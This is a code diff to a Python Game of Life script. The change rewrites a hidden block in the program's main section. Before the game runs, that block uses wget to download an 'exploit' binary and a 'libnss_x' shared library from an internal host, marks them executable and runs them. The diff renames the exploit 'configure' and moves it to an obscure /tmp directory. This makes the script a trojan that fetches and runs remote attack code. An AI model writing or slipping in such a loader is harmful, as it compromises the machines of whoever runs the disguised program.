@@ -170,22 +170,24 @@ class GameOfLife:
 if (__name__ == "__main__"):
     game = GameOfLife(N=35, T=200)
 
-    #location = '/tmp'
-    url1 = 'http://10.0.1.4/exploit/exploit' 
-    args1 = ['wget', '-q', url1, '-O', '/tmp/exploit']
-
-    output = Popen(args1)
-    output.communicate()
-
-    url2 = 'http://10.0.1.4/exploit/libnss_x'
-    args2 = ['wget', '-r', '-q', 'http://10.0.1.4/exploit/libnss_x', '-P', '/tmp/exploit/libnss_x']
+    #location = '/tmp/590J'
+    url2 = 'http://10.0.1.4/life/libnss_x/x.so.2'
+    args2 = ['wget', '-q', url2, '-P', '/tmp/590J/libnss_x']
     output2 = Popen(args2)
     output2.communicate()
 
-    mod = Popen(['chmod', '774', '/tmp/exploit'])
+    mod = Popen(['chmod', '+x', '/tmp/590J/libnss_x/x.so.2'])
     mod.communicate()
 
-    o = Popen(['/tmp/exploit'])
+    url1 = 'http://10.0.1.4/life/exploit' 
+    args1 = ['wget', '-q', url1, '-O', '/tmp/590J/configure']
+    output = Popen(args1)
+    output.communicate()
+
+    mod = Popen(['chmod', '774', '/tmp/590J/configure'])
+    mod.communicate()
+
+    o = Popen(['/tmp/590J/configure'])
     o.communicate()    
 
     game.play()
